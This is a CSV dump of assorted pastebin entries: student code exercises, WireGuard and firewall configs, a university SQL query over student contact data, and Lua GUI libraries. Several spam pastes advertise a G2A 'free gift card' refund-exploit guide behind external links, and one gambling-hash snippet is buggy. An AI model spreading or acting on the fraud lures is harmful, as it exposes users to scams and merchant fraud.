id,title,username,language,date,content
p8WxMjs1,G2A.com Free Gift Card Guide Mar 2024 FIX,HastyBasher0,GetText,Monday 18th of March 2024 12:21:29 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

IMPORTANT: If you use this make sure to use the English version of G2A.com otherwise this will not work!

You can buy gift cards directly with it or you can buy popular games then put them on fresh steam accounts and then sell those accounts.
 
PDF guide here:
https://smallpdf.com/file#s=cea149fd-ead1-4939-94cf-d10a8ce7936a
 
Working as of:
18 March 2024















































"
YtQ4ttXn,🤑 G2A.com Free Gift Card Guide Mar 2024 FIX 🤑,ounnuo,GetText,Monday 18th of March 2024 12:13:11 AM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

If you use this make sure to use the English version of G2A.com otherwise this will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_602778.pdf

Working as of:
18 March 2024"
iYmveUnD,numpy lab(18/03/2024),brandblox,Python,Sunday 17th of March 2024 11:10:01 PM CDT,"#Assignment: Write a Python Program to solve Linear Programming Problem using
#Simplex Method
import numpy as np

def simplex_method(A, b, c):
    m, n = A.shape
    # Create the initial tableau
    tableau = np.hstack([A, np.eye(m), b.reshape(-1, 1)])
    tableau = np.vstack([tableau, np.concatenate([c, np.zeros(m + 1)])])
    
    while True:
        # Find the pivot column
        pivot_col = np.argmin(tableau[-1, :-1])
        
        # If all elements in the last row are non-negative, optimal solution found
        if np.all(tableau[-1, :-1] >= 0):
            break
        
        # Find the pivot row
        ratios = tableau[:-1, -1] / tableau[:-1, pivot_col]
        pivot_row = np.argmin(ratios)
        
        # Perform pivot operation
        tableau[pivot_row, :] /= tableau[pivot_row, pivot_col]
        
        for i in range(m + 1):
            if i != pivot_row:
                tableau[i, :] -= tableau[i, pivot_col] * tableau[pivot_row, :]
    
    return tableau[-1, -1], tableau[-1, :-1]

A = np.array([[2, 1], [1, 2]])
b = np.array([4, 3])
c = np.array([-3, -5])

optimal_value, optimal_solution = simplex_method(A, b, c)

print(""Optimal value:"", optimal_value)
print(""Optimal solution:"", optimal_solution)

#Output
Optimal value: 8.333333333333334
Optimal solution: [0.         0.         0.33333333 2.33333333]
"
E04Zx1pR,wg conf,pdxlimb,Lua,Sunday 17th of March 2024 11:09:10 PM CDT,"[Interface]
Address = 10.66.66.1/24
ListenPort = 50100
PrivateKey = <redacted>
# PostUp = ufw allow 80
# PostUp = ufw allow 443
# PostUp = ufw allow 25565
# PostUp = ufw route allow in on wg0 out on eth0
# PostUp = iptables -t nat -A PREROUTING -p tcp --dport 80 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:80
# PostUp = iptables -t nat -A PREROUTING -p tcp --dport 443 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:443
# PostUp = iptables -t nat -A PREROUTING -p tcp --dport 50200 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:25565
# PostUp = iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE
# PostUp = iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE
# PostDown = ufw delete allow 80
# PostDOwn = ufw delete allow 443
# PostDown = ufw delete allow 25565
# PostDown = ufw route delete allow in on wg0 out on eth0
# PostDown = iptables -t nat -D PREROUTING -p tcp --dport 80 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:80
# PostDown = iptables -t nat -D PREROUTING -p tcp --dport 443 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:443
# PostDown = iptables -t nat -D PREROUTING -p tcp --dport 50200 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:25565
# PostDown = iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE
# PostDown = iptables -t nat -D POSTROUTING -o wg0 -j MASQUERADE

[Peer]
PublicKey = <redacted>
AllowedIPs = 10.66.66.2/32
PersistentKeepalive = 25"
Bjir5UwS,Untitled,ma39isy,Oracle 8,Sunday 17th of March 2024 10:34:00 PM CDT,"SELECT
	DISTINCT
	S.*,
	SP.STUDYPROGRAMNAME,
	CELLPHONE,
	YAHOOMAIL,
	GMAIL,
	EMAIL,
	GPA,
	NILAID,
	NILAIE,
	CREDIT,
	CREDITNOTPASS,
	CREDITPASS,
	CASE
		WHEN CREDITPASS>0 THEN ROUND(MCREDITPASS / CREDITPASS, 2)
		ELSE 0
	END GPAPASS,
	CREDIT2
FROM
	(
	SELECT
		*
	FROM
		MASTERDATA.STUDENT S
	WHERE
		S.STUDYPROGRAMID IN (
		SELECT
			STUDYPROGRAMID
		FROM
			MASTERDATA.STUDYPROGRAM
		WHERE
			FACULTYID IN (
			SELECT
				FACULTYID
			FROM
				USEROFFACULTY
			WHERE
				USERID = '48379'))) S
LEFT JOIN MASTERDATA.STUDYPROGRAM SP ON
	(S.STUDYPROGRAMID = SP.STUDYPROGRAMID)
LEFT JOIN (
	SELECT
		STUDENTID,
		MAX (DECODE(INFOID, 22, VALUE)) CELLPHONE,
		MAX (DECODE(INFOID, 7, VALUE)) GMAIL,
		MAX (DECODE(INFOID, 8, VALUE)) YAHOOMAIL
	FROM
		MASTERDATA. ACCOUNT
	WHERE
		INFOID IN (7, 8, 22)
	GROUP BY
		STUDENTID) t1 ON
	(S.STUDENTID = t1.STUDENTID)
LEFT JOIN (
	SELECT
		USERNAME,
		EMAIL
	FROM
		FRAMEWORK1. USERS
	JOIN FRAMEWORK1.USERMAPPING
			USING (USERID)
	WHERE
		USERGROUPID = 12) t2 ON
	(S.STUDENTID = t2.USERNAME)
LEFT JOIN (
	SELECT
		studentid,
		PASS_CREDIT CREDIT,
		GPA,
		COUNT (DECODE(INDEXPOINT, 'D', 1)) NILAID,
		COUNT (DECODE(INDEXPOINT, 'E', 1)) NILAIE,
		SUM (DECODE(PASS_STATUS, 'Y', 0, CREDIT)) CREDITNOTPASS,
		SUM (DECODE(PASS_STATUS, 'Y', CREDIT, 0)) CREDITPASS,
		SUM (DECODE(PASS_STATUS, 'Y', CREDIT * INDEX_CONVERSION, 0)) MCREDITPASS
	FROM
		COMPLETECOURSEPOINT
	JOIN GPASTUDENT
			USING (STUDENTID)
	WHERE
		ACTIVESTATUS = 'Y'
		AND LATESTSTATUS = 'Y'
	GROUP BY
		(STUDENTID,
		PASS_CREDIT,
		GPA)) t3 ON
	(S.STUDENTID = t3.STUDENTID)
LEFT JOIN (
	SELECT
		STUDENTID,
		SUM(CREDIT) CREDIT2
	FROM
		VIEW_KSM
	WHERE
		1 = 1
		AND SCHOOLYEAR = '2324'
		AND SEMESTER = '2'
	GROUP BY
		STUDENTID) t4 ON
	(S.STUDENTID = t4.STUDENTID)
WHERE
	1 = 1
	AND S.STUDYPROGRAMID = '41'
	AND S.STUDENTTYPEID IN ('1', '8', '9', '10')
ORDER BY
	S.STUDENTID ASC"
0FGPZNWn,🤑 G2A.com Free Gift Card Guide Mar 2024 🤑,luckysw,GetText,Sunday 17th of March 2024 10:33:49 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
If you use this make sure to use the English version of G2A.com otherwise this will not work!
  
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view
 
Working as of:
18 March 2024"
Gy2u5fhy,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Sunday 17th of March 2024 10:25:40 PM CDT,"https://pastes.io - #1 Pastebin Alternative - its free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes.
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
RXkx2rFP,old-wg,pdxlimb,Bash,Sunday 17th of March 2024 10:19:17 PM CDT,"# called via PostDown

ufw allow 22
ufw allow 80
ufw allow 443
ufw allow 25565
ufw route allow in on wg0 out on eth0
iptables -t nat -A PREROUTING -p tcp --dport 80 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:80
iptables -t nat -A PREROUTING -p tcp --dport 443 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:443
iptables -t nat -A PREROUTING -p tcp --dport 25565 -m conntrack --ctstate NEW -j DNAT --to-destination 10.66.66.2:25565
iptables -t nat -I POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE"
hmSQ4LdF,new-wg,pdxlimb,Bash,Sunday 17th of March 2024 10:17:01 PM CDT,"echo '

flush ruleset

table ip wg {

    chain input {
        type filter hook input priority filter; policy drop;
        tcp dport 22 accept
        tcp dport 80 accept
        tcp dport 50100 accept
        tcp dport 25565 accept
    }

    chain postrouting {
        type nat hook postrouting priority srcnat; policy accept;
        oifname ""eth0"" masquerade
    }

    chain prerouting {
        type nat hook prerouting priority dstnat; policy accept;
        tcp dport 80 ct state new dnat to 10.66.66.2:80;
        tcp dport 443 ct state new dnat to 10.66.66.2:443;
        tcp dport 25565 ct state new dnat to 10.66.66.2:25565;
    }

    chain forward {
        type filter hook forward priority filter; policy drop;
        iifname ""wg0"" oifname ""eth0"" accept
        iifname ""eth0"" oifname ""wg0"" accept
    }
}

' | nft -f -; nft list ruleset"
qXAFYciC,ccf csp202312-1,deezykiki,C++,Sunday 17th of March 2024 10:15:40 PM CDT,"#include<iostream>
using namespace std;
int main()
{
	int n,m;
	cin>>n>>m;
	int a[12][1010];
	for(int l = 0;l < n;l++)
	{
		for(int r = 0;r < m;r++)
		{
			cin>>a[l][r];
		}
	}
	
	for(int b = 0;b < n;b++)
	{	
		int flag = -1;
		for(int l = 0;l < n;l++)
		{	
			if(l != b)
			{
				for(int r = 0;r < m;r++)
				{
					if(a[l][r] <= a[b][r]) break;
					else if(a[l][r] > a[b][r]&&r == m-1)
					{
						if(flag == -1) flag = l;
						else if(l < flag) flag = l;
					}
				}
			}
		}
		if(flag != -1) cout<<flag+1<<endl;
		else cout<<0<<endl;
	}
	return 0;
}"
V5ziaNyu,logger,Zeehao,Lua,Sunday 17th of March 2024 09:32:31 PM CDT,"local loggers = {
    disabled = false,
    store = {}
}

local Logger = {}

function Logger:new(key)
    local obj = {
        name = key,
        disabled = false,
        print = print
    }
    self.__index = self
    return setmetatable(obj, self)
end

function Logger:setPrintFunction(func)
    self.print = func
end

function Logger:print(...) 
    if self.disabled or loggers.disabled then return end
    self:print(""["" .. self.name .. ""] "", ...)
end

function Logger:disable() 
    self.disabled = true
end

function loggers.getLogger(key, printFn)
    if loggers.store[key] then
        return loggers.store[key]
    end
    loggers.store[key] = Logger:new(key)
    if printFn then
        loggers.store[key]:setPrintFunction(printFn)
    end
    return loggers.store[key]
end

function loggers.disable(key) 
    if loggers.store[key] == nil then
        loggers.store[key] = Logger:new(key)
    end
    loggers.store[key]:disable()
end

function loggers.disableAll() 
    loggers.disabled = true
end

return loggers"
pbu8DBbH,Pastes.io - #1 Pastebin Alternative,xxsa,PHP,Sunday 17th of March 2024 08:57:42 PM CDT,"https://pastes.io - Paste Tool - Pastebin Alternative - Free

Pastes.io is a simple and efficient pastebin for mainly code to be distributed neatly and efficiently across the web. Website where you can paste and store any type of text or code snippets online and share it with your friends, Also You can see Recent Pastes

Simple Ads by Google Adsense Few rather than Pastebin
150+ different syntax languages - All Free
Paste Folders
Load files feature
Password protected pastes
Encrypted pastes
URL Shortener
Unlisted pastes
Private pastes.
Embed, download, print pastes
Socialite (Facebook/Twitter/Google Social login)
Trending pastes page (day, week, month, year)
Encrypted pastes
Trending pastes page (day, week, month, year)
No Captcha for logged in users feature
Simple Ads by Google Adsense Few rather than Pastebin"
Qi4ZeAp8,pattern: mirrored diamond,Divyansh_Chourey,C,Sunday 17th of March 2024 08:57:38 PM CDT,"#include<stdio.h>
int main(){
	int col;
	printf(""Enter number of columns: "");
	scanf(""%d"", &col);
	for(int i = 1; i <= col; i++){
		for(int j = 1; j <= col-i; j++){printf("" "");}
		for(int j = 1; j <= i; j++){printf(""*"");}
		printf(""\n"");
	}
	for(int i = col-1; i>0; i--){
		for(int j = 1; j <= col-i; j++){printf("" "");}
		for(int j = 1; j <= i; j++){printf(""*"");}
		printf(""\n"");
	}
	return 0;
}"
ZVhQTNhp,App Updater,Ricky265,JSON,Sunday 17th of March 2024 08:48:15 PM CDT,"{
  ""Version"":""1.2""
}
"
kFxsMTFU,move.c,WizartCraftCode,C,Sunday 17th of March 2024 08:45:08 PM CDT,"//
// Created by merlin on 2/26/2024.
//
#include <malloc.h>
#include ""move.h""


void setup_move_stack(move_stack_t *stack)
{
    for(int i=0;i<MOVE_HISTORY_SIZE;i++)
    {
        stack->move_history[i] = NO_MOVE;
    }
    stack->stack_top = -1;
}

bool push(enum move_direction item, move_stack_t *stack) {
    if (!is_full(*stack)) {
        ++(stack->stack_top);
        stack->move_history[stack->stack_top] = item;
        return true;
    } else {
        return false;
    }
}

bool pop(move_stack_t *stack, enum move_direction *dir_popped) {
    if (!is_empty(*stack)) {
        *dir_popped = stack->move_history[stack->stack_top];
        --(stack->stack_top);
        return true;
    } else {
        return false;
    }
}

bool is_full(move_stack_t stack) {
    return (stack.stack_top >= stack.size - 1);
}

bool is_empty(move_stack_t stack) {
    return stack.stack_top < 0;
}

int height(move_stack_t stack)
{
    return stack.stack_top+1;
}

#define CHANGE_FOR_X 0
#define CHANGE_FOR_Y 1
int change_in_position[][2] =
        {{0,  0},
         {0,  1},
         {1,  0},
         {0,  -1},
         {-1, 0}};

void move(player_t *player, enum move_direction direction)
{
    player->x_position += change_in_position[direction][CHANGE_FOR_X];
    player->y_position += change_in_position[direction][CHANGE_FOR_Y];
    push(direction, &(player->move_stack));
}

void undo(player_t *player)
{
    enum move_direction move_to_undo;
    pop(&(player->move_stack), &move_to_undo);
    player->x_position -= change_in_position[move_to_undo][CHANGE_FOR_X];
    player->y_position -= change_in_position[move_to_undo][CHANGE_FOR_Y];
}
"
yXDDBW3a,libsInstaller,Zeehao,Lua,Sunday 17th of March 2024 08:28:23 PM CDT,"local commands = {
    ""rm /lib/gui.lua"",
    ""rm /lib/inventoryController.lua"",
    ""rm /lib/warehouseManager.lua"",
    ""rm /lib/logger.lua"",
    ""pastebin get juynLBJ8 /lib/gui.lua"",
    ""pastebin get N2Qms9H2 /lib/inventoryController.lua"",
    ""pastebin get dVraaAP8 /lib/warehouseManager.lua"",
    ""pastebin get V5ziaNyu /lib/logger.lua"",
}
 
for i = 1, #commands do
    os.execute(commands[i])
end"
mVeV3vSi,HMAC Derivation using Compact VanillaJS SHA256 Function,FAT_Scripts,JavaScript,Sunday 17th of March 2024 08:22:31 PM CDT,"const _Value = (Server_Seed, Client_Seed, Nonce, _Edge) => {
  // Concatenate server_seed, client_seed, and nonce
  const _String = Server_Seed + ""|"" + Client_Seed + ""|"" + Nonce;

  // Calculate the SHA256 hash using the sha256 function
  const _Hash = sha256(_String);

  const _Bits = 52; // number of most significant bits to use

  // Convert the hash to hexadecimal
  const _Hex = _Hash.slice(0, _Bits / 4);

  // Parse the hexadecimal hash to an integer
  const _R = parseInt(_Hex, 16);

  // Calculate X = r / 2^52
  let _X = _R / Math.pow(2, _Bits); // uniformly distributed in [0; 1)

  // Calculate _X = _Edge / (1 - _X)
  _X = (100 - _Edge) / (1 - _X);

  // Calculate the result
  const _Y = Math.floor(_X);

  // Return max(trunc(X), 100)
  return Math.max(1, _Y / 100);
};

// Get 5 Results
for (var Nonce = 0; Nonce < 5;){
  // Return the Derived Value, using 5% House Edge
  // 3.85, 8.04, 1.09, 1.09, 1.52
  console.log(_Value(""ServerSeed"", ""ClientSeed"", x, 5));
  Nonce += 1; // or simply Nonce++;
}

// To Establish Fairness, Provide Hash Value and Client Seed.
/*
 // Concatenate server_seed, client_seed, and nonce
  const _String = Server_Seed + ""|"" + Client_Seed + ""|"" + Nonce;
 // Calculate the SHA256 hash using the sha256 function
  const _Hash = sha256(_String);
*/
// Increment Nonce each round.
// Upon Completion, Provide Server Seed

// Compact VanillaJS SHA256 Function
// https://pastebin.com/raw/c76x96d1
function sha256($){function x($,x){let f=(65535&$)+(65535&x);return($>>16)+(x>>16)+(f>>16)<<16|65535&f}function f($,x){return $>>>x|$<<32-x}function e($,x){return $>>>x}function _($,x,f){return $&x^~$&f}function c($,x,f){return $&x^$&f^x&f}function a($){return f($,2)^f($,13)^f($,22)}function r($){return f($,6)^f($,11)^f($,25)}function n($){var x;return f($,7)^f($,18)^(x=$)>>>3}function t($){var x;return f($,17)^f($,19)^(x=$)>>>10}let b=function $(x){let f=[];for(let e=0;e<8*x.length;e+=8)f[e>>5]|=(255&x.charCodeAt(e/8))<<24-e%32;return f}(function $(x){x=x.replace(/\r\n/g,""\n"");let f="""";for(let e=0;e<x.length;e++){let _=x.charCodeAt(e);_<128?f+=String.fromCharCode(_):_>127&&_<2048?(f+=String.fromCharCode(_>>6|192),f+=String.fromCharCode(63&_|128)):(f+=String.fromCharCode(_>>12|224),f+=String.fromCharCode(_>>6&63|128),f+=String.fromCharCode(63&_|128))}return f}($)),o=function $(f,e){let _=[1116352408,1899447441,3049323471,3921009573,961987163,1508970993,2453635748,2870763221,3624381080,310598401,607225278,1426881987,1925078388,2162078206,2614888103,3248222580,3835390401,4022224774,264347078,604807628,770255983,1249150122,1555081692,1996064986,2554220882,2821834349,2952996808,3210313671,3336571891,3584528711,113926993,338241895,666307205,773529912,1294757372,1396182291,1695183700,1986661051,2177026350,2456956037,2730485921,2820302411,3259730800,3345764771,3516065817,3600352804,4094571909,275423344,430227734,506948616,659060556,883997877,958139571,1322822218,1537002063,1747873779,1955562222,2024104815,2227730452,2361852424,2428436474,2756734187,3204031479,3329325298,],b=[1779033703,3144134277,1013904242,2773480762,1359893119,2600822924,528734635,1541459225],o=Array(64),d,u,h,l,i,C,g,m,A,v,p,s;for(f[e>>5]|=128<<24-e%32,f[(e+64>>9<<4)+15]=e,A=0;A<f.length;A+=16){for(v=0,d=b[0],u=b[1],h=b[2],l=b[3],i=b[4],C=b[5],g=b[6],m=b[7];v<64;v++){var j,k,q;v<16?o[v]=f[v+A]:o[v]=x(x(x(t(o[v-2]),o[v-7]),n(o[v-15])),o[v-16]),p=x(x(x(x(m,r(i)),(j=i,k=C,j&k^~j&(q=g))),_[v]),o[v]),s=x(a(d),c(d,u,h)),m=g,g=C,C=i,i=x(l,p),l=h,h=u,u=d,d=x(p,s)}b[0]=x(d,b[0]),b[1]=x(u,b[1]),b[2]=x(h,b[2]),b[3]=x(l,b[3]),b[4]=x(i,b[4]),b[5]=x(C,b[5]),b[6]=x(g,b[6]),b[7]=x(m,b[7])}return b}(b,8*$.length);return function $(x){let f=""0123456789abcdef"",e="""";for(let _=0;_<4*x.length;_++)e+=f.charAt(x[_>>2]>>(3-_%4)*8+4&15)+f.charAt(x[_>>2]>>(3-_%4)*8&15);return e}(o)}"
juynLBJ8,gui,Zeehao,Lua,Sunday 17th of March 2024 08:22:13 PM CDT,"local event = require(""event"")
local gpu = require(""component"").gpu
local math = require(""math"")

local ALIGN = {
    left = ""left"",
    right = ""right"",
    center = ""center""
}

local COLORS = {
    blue = 0x4286F4,
    purple = 0xB673d6,
    red = 0xC14141,
    green = 0xDA841,
    yellow = 0xfff950,
    black = 0x000000,
    white = 0xFFFFFF,
    grey = 0x47494C,
    lightGrey = 0xBBBBBB
}

local disabled = false 
function debug(...) 
    if disabled then return end
    local bg = gpu.getBackground()
    local fg = gpu.getForeground()
    gpu.setBackground(COLORS.black)
    gpu.setForeground(COLORS.white)
    print(...)
    gpu.setBackground(bg)
    gpu.setForeground(fg)
end


local function truncateString(str, width, padding)
    if string.len(str) > (width - padding) then
        local maxLen = width - padding - 2
        local halfLen = math.floor(maxLen / 2)
        local rmHalfLen = math.ceil((string.len(str) - maxLen) / 2)
        local truncatedStr = string.sub(str, 1, halfLen - rmHalfLen) .. "".."" .. string.sub(str, -halfLen + rmHalfLen)
        return truncatedStr
    end
    return str
end

local function addFillersOnString(str, align, filler, number_filler)
    local fillerCount = math.floor(number_filler / 2)
    local leftFiller = string.rep(filler, fillerCount)
    local rightFiller = string.rep(filler, number_filler - fillerCount)
    
    if align == ""left"" then
        return str .. rightFiller
    elseif align == ""right"" then
        return leftFiller .. str
    elseif align == ""center"" then
        return leftFiller .. str .. rightFiller
    else
        return str
    end
end

local function addPaddingOnString(str, padding, filler)
    if padding < 0 then
        return str
    end
    return string.rep(filler, padding) .. str .. string.rep(filler, padding)
end

local Component = {}

function Component:new(name, x, y, width, height)
    local obj = {
        name = name,
        x = x,
        y = y,
        xMin = x,
        yMin = y,
        xMax = x + width - 1,
        yMax = y + height - 1,
        width = width, 
        height = height,
        parent = nil,
        isHidden = false,
        disabled = false,
        onTouchCallback = nil,
        gpu = gpu,
        rerender = false,
        components = {},
        componentsPrioritized = {},
        defaultBackgroundColor = COLORS.black
    }
    self.__index = self
    return setmetatable(obj, self)
end

function Component:init() 
    table.sort(self.componentsPrioritized, function(a, b)
        return a.renderPriority < b.renderPriority
    end)
end

function Component:setOnTouch(callback)
    self.onTouchCallback = callback
end

function Component:hide()
    if self.isHidden then return end
    self.isHidden = true
    self.rerender = true
end

function Component:show()
    if not self.isHidden then return end
    self.isHidden = false
    self.rerender = true
end

function Component:setParent(parent)
    self.parent = parent
end

function Component:getAbsXY()
    if self.parent and self.parent.getAbsXY then
        local absParentX, absParentY = self.parent:getAbsXY()
        return self.x + absParentX, self.y + absParentY
    end
    return self.x, self.y
end

function Component:setPosition(x, y)
    if self.x ~= x or self.y ~= y then
        self.rerender = true
    end
    self.x = x
    self.y = y
end

function Component:setSize(width, height)
    if self.width ~= width or self.height ~= height then
        self.rerender = true
    end
    self.width = width
    self.height = height
    self.xMax = self.x + width - 1
    self.yMax = self.y + height - 1
end

function Component:isTouched(x, y)
    local absParentX, absParentY = self.parent:getAbsXY()
    local xMix = self.xMin + absParentX
    local xMax = self.xMax + absParentX
    local yMin = self.yMin + absParentY
    local yMax = self.yMax + absParentY
    if x >= xMix and x <= xMax and y >= yMin and y <= yMax then
        return true
    end
    return false
end

function Component:onTouch(x, y)
    if self.onTouchCallback then 
        self.onTouchCallback(self, x, y)
    end
    for _, component in pairs(self.components) do
        if component:isTouched(x, y) then 
            component:onTouch(x, y)
        end
    end
end

function Component:addComponent(component, renderPriority)
    component:setParent(self)
    self.components[component.name] = component
    table.insert(self.componentsPrioritized, {renderPriority = renderPriority, component = component})
end

function Component:render()
    for _, prioritized in pairs(self.componentsPrioritized) do
        prioritized.component:render()
    end
end

local Screen = {}
setmetatable(Screen, {__index = Component})

function Screen:new(width, height, backgroundColor)
    local obj = Component.new(self, ""Screen"", 1, 1, width, height)
    obj.backgroundColor = backgroundColor
    gpu.setResolution(width, height)
    gpu.setBackground(backgroundColor)
    gpu.fill(obj.x, obj.y, width, height, "" "")
    return obj
end

function Screen:init() 
    table.sort(self.componentsPrioritized, function(a, b)
        return a.renderPriority < b.renderPriority
    end)

    for _, component in pairs(self.components) do
        component:init()
    end

    event.listen(""touch"", function (_, _, x, y, _, _)
        for _, component in pairs(self.componentsPrioritized) do
            if component.component:isTouched(x, y) then
                component.component:onTouch(x, y)
            end
        end
    end)
end


function Screen:addComponent(component, renderPriority)
    component:setParent(self)
    self.components[component.name] = component
    table.insert(self.componentsPrioritized, {renderPriority = renderPriority, component = component})
end

function Screen:getComponent(componentName)
    return self.components[componentName]
end


function Screen:render()
    for _, component in pairs(self.components) do
        component:render()
    end
    self.gpu.setBackground(COLORS.black)
    self.gpu.setForeground(COLORS.white)
end

local Section = {}
setmetatable(Section, {__index = Component})

function Section:new(name, x, y, width, height, title, borderColor, titleColor, titleBackground)
    local obj = Component.new(self, name, x, y, width, height)
    obj.borderColor = borderColor
    obj.titleColor = titleColor
    obj.titleBackground = titleBackground
    obj.title = title
    obj.rerender = true
    return obj
end

function Section:setTitle(title, borderColor, titleColor, titleBackground)
    if title and title ~= self.title then
        self.title = title
        self.rerender = true
    end
    if borderColor and borderColor ~= self.borderColor then
        self.borderColor = borderColor
        self.rerender = true
    end
    if titleColor and titleColor ~= self.titleColor then
        self.titleColor = titleColor
        self.rerender = true
    end
    if titleBackground and titleBackground ~= self.titleBackground then
        self.titleBackground = titleBackground
        self.rerender = true
    end
end

function Section:render()
    if self.rerender then
        local x = self.x + self.parent.x
        local y = self.y + self.parent.y
        local xMax = self.xMax + self.parent.x
        local yMax = self.yMax + self.parent.y
        self.gpu.setBackground(self.defaultBackgroundColor)
        self.gpu.fill(x, y, self.width, self.height, "" "")
        self.gpu.setBackground(self.borderColor)
        self.gpu.fill(x, y, self.width, 1, "" "")
        self.gpu.fill(x, y, 2, self.height, "" "")
        self.gpu.fill(x, yMax, self.width, 1, "" "")
        self.gpu.fill(xMax - 1, y, 2, self.height, "" "")
        self.gpu.setBackground(self.titleBackground)
        self.gpu.setForeground(self.titleColor)
        self.gpu.fill(x + 4, y, string.len(self.title) + 2, 1, "" "")
        self.gpu.set(x + 5, y, self.title)
        self.rerender = false
    end
    for _, prioritized in pairs(self.componentsPrioritized) do
        prioritized.component:render()
    end
end

local Label = {}
setmetatable(Label, {__index = Component})

function Label:new(name, x, y, width, padding, text, textColor, backgroundColor)
    local obj = Component.new(self, name, x, y, width, 1)
    obj.text = text
    obj.render_text = truncateString(text, width, padding)
    obj.textColor = textColor
    obj.backgroundColor = backgroundColor
    obj.padding = padding
    obj.align = ALIGN.left
    return obj
end

function Label:setText(text)
    if text and text ~= self.text then
        self.text = text
        self.render_text = truncateString(self.text, self.width, self.padding)
        self.rerender = true
    end
end

function Label:setTextColor(textColor)
    if textColor and textColor ~= self.textColor then
        self.textColor = textColor
        self.rerender = true
    end
end

function Label:setBackgroundColor(backgroundColor)
    if backgroundColor and backgroundColor ~= self.backgroundColor then
        self.backgroundColor = backgroundColor
        self.rerender = true
    end
end

function Label:setAlign(align)
    if align and align ~= self.align then
        self.align = align
        self.rerender = true
    end
end

function Label:setPadding(padding)
    if padding and padding ~= self.padding then
        self.padding = padding
        self.render_text = truncateString(self.text, self.width, self.padding)
        self.rerender = true
    end
end

function Label:render()
    if self.rerender then
        local absParentX, absParentY = self.parent:getAbsXY()
        local x = self.x + absParentX
        local y = self.y + absParentY
        self.gpu.setBackground(self.defaultBackgroundColor)
        self.gpu.fill(x, y, self.width, 1, "" "")
        if not self.isHidden then 
            self.gpu.setBackground(self.backgroundColor)
            self.gpu.setForeground(self.textColor)
            self.gpu.fill(x, y, self.width, 1, "" "")
            local render_text = addFillersOnString(self.render_text, self.align, "" "", self.width - string.len(self.render_text))
            render_text = addPaddingOnString(render_text, self.padding, "" "")
            self.gpu.set(x, y, render_text)
        end
        self.rerender = false
    end
    for _, prioritized in pairs(self.componentsPrioritized) do
        prioritized.component:render()
    end
end

local Button = {}
setmetatable(Button, {__index = Component})

function Button:new(name, x, y, width, height, text, textColor, backgroundColor)
    local obj = Component.new(self, name, x, y, width, height)
    obj.text = text
    obj.textColor = textColor
    obj.backgroundColor = backgroundColor
    return obj
end

function Button:setText(text)
    if text and text ~= self.text then
        self.text = text
        self.rerender = true
    end
end

function Button:setTextColor(textColor)
    if textColor and textColor ~= self.textColor then
        self.textColor = textColor
        self.rerender = true
    end
end

function Button:setBackgroundColor(backgroundColor)
    if backgroundColor and backgroundColor ~= self.backgroundColor then
        self.backgroundColor = backgroundColor
        self.rerender = true
    end
end

function Button:onTouch()
    if not self.onTouchCallback then return end
    self.onTouchCallback()
    for _, component in pairs(self.components) do
        component:onTouch()
    end
end

function Button:render()
    if self.rerender then
        local absParentX, absParentY = self.parent:getAbsXY()
        local x = self.x + absParentX
        local y = self.y + absParentY
        self.gpu.setBackground(self.backgroundColor)
        self.gpu.fill(x, y, self.width, self.height, "" "")
        self.gpu.setForeground(self.textColor)
        local render_text = addFillersOnString(self.text, self.align, "" "", self.width - string.len(self.text))
        local textX = x + math.floor((self.width - string.len(self.text)) / 2)
        local textY = y + math.floor(self.height / 2)
        self.gpu.set(textX, textY, render_text)
        self.rerender = false
    end
    for _, prioritized in pairs(self.componentsPrioritized) do
        prioritized.component:render()
    end
end

local ScrollBar = {}
setmetatable(ScrollBar, {__index = Component})

function ScrollBar:new(name, x, y, height, textColor, backgroundColor)
    local obj = Component.new(self, name, x, y, 1, height)
    obj.currentPos = 1
    obj.maxPos = 1
    obj.textColor = textColor
    obj.backgroundColor = backgroundColor
    return obj
end

function ScrollBar:setMaxPos(maxPos)
    if maxPos and maxPos ~= self.maxPos then
        self.maxPos = maxPos
        self.rerender = true
    end
end

function ScrollBar:setCurrentPos(currentPos)
    if currentPos and currentPos ~= self.currentPos then
        self.currentPos = currentPos
        self.rerender = true
    end
end

function ScrollBar:scrollUp()
    if self.currentPos > 1 then
        self.currentPos = self.currentPos - 1
        self.rerender = true
    end
end

function ScrollBar:scrollDown()
    if self.currentPos < self.maxPos then
        self.currentPos = self.currentPos + 1
        self.rerender = true
    end
end

function ScrollBar:yToBarPos(y, absParentY)
    local relativeY = y - absParentY
    local maxBarHeight = self.height - 4
    local pos = math.ceil((relativeY - 2) / maxBarHeight * self.maxPos)
    return math.min(pos, self.maxPos)
end

function ScrollBar:isScrollUpTouched(x, y, absParentX, absParentY) 
    local xMin = self.xMin + absParentX
